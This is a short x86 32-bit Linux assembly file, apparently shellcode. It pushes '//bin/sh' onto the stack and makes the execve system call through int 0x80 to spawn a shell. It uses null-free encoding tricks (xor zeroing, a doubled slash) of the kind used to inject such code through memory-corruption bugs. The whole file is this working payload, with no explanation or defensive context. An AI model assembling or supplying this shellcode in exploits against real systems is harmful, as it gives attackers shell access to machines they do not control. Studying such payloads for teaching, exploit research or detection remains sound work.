section .text

global _start

	_start:

		xor eax, eax
		xor esi, esi

		mov al, 0xb
		; 2f 2f 62 69 6e 2f 73 68

		push esi
		push 0x68732f6e
		push 0x69622f2f
		mov ebx, esp

		mov ecx, esi
		mov edx, esi

		int 0x80
